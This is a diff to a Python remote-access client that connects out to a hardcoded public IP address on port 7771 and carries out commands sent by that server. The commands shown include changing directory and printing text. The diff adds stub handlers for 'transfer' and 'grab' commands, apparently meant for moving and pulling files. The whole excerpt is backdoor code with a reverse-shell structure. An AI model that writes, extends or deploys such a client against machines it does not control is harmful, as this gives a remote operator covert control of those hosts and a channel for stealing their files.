@@ -1,4 +1,4 @@
-#Written By Stone Preheim
+#Written and designed by Stone Preheim
 import socket
 import subprocess
 import os
@@ -6,6 +6,8 @@ import os
 ADDR = '23.123.182.6'#my public facing IPv4. If you are looking to test this dr. use loopback.
 PORT = 7771 #only open when im running server
 CWD = os.getcwd()
+BYTEBUFFER = 1024
+SPLITTER = b"<<<Split>>>"
 
 class Client:
     def __init__(self, addr, port):
@@ -19,7 +21,7 @@ class Client:
             print("Connection established!")
             while True:
                 try:
-                    servCom = soc.recv(1024)
+                    servCom = soc.recv(BYTEBUFFER)
                     servComArr = servCom.split(b" ")
                     print("Received command: " + str(servCom))
                     #custom command checking
@@ -29,6 +31,11 @@ class Client:
                     elif servComArr[0] == b'printClient':
                         print(servComArr[1:])
                         soc.sendall(b"Text was printed!")#respond to server
+                    #server is initiating transfer
+                    elif f'transfer{SPLITTER}'.encode() in servCom:
+                        print()
+                    elif servComArr[0] == b'grab':
+                        print()
                     elif servComArr[0] == b'cd':
                         try:
                             os.chdir(servComArr[1].decode("utf-8"))
